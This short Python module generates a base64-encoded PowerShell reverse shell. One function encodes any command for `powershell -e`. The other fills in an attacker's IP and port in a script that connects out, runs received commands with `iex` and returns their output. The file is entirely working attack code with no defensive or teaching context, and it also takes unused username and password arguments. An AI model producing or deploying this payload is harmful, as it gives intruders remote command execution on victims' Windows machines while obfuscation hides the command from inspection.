import os
import base64

def ps_b64(cmd):
    utf16_bytes = cmd.encode('utf-16le')
    base64_encoded = base64.b64encode(utf16_bytes).decode('ascii')
    return f'powershell -e {base64_encoded}'

def revshell_ps(username, password, ip, port):
    ps_rshell = (
"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
"$stream = $client.GetStream();"
"[byte[]]$bytes = 0..65535|%{{0}};"
"while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{"
"$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
"$sendback=(iex $data 2>&1 | Out-String );"
"$sendback2=$sendback + '>_ ';"
"$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
"$stream.Write($sendbyte,0,$sendbyte.Length);"
"$stream.Flush()}};$client.Close()"
    )
    ps_rshell = ps_rshell.format(ip=ip, port=port)
    return ps_b64(ps_rshell)